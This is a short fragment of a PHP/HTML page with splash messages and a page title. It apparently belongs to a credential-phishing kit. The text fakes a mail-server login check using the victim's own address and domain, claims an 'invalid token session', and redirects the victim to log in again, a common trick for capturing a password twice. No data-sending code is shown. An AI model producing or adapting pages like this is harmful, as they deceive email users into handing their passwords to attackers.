...
splashmessage[0]='Connecting to <?php echo $login ?>'

splashmessage[1]='Please wait...'

splashmessage[2]='Verifying password for <?php echo $login ?>'

splashmessage[3]='Please wait...'

splashmessage[4]='Invalid token session. Please login again'

splashmessage[5]='Connecting to <?php echo $yuh ?> mail server'

splashmessage[6]='Redirecting to login page...'
...
<title> Loggin in to <?php echo $yuh ?> </title>
</head>
<body>
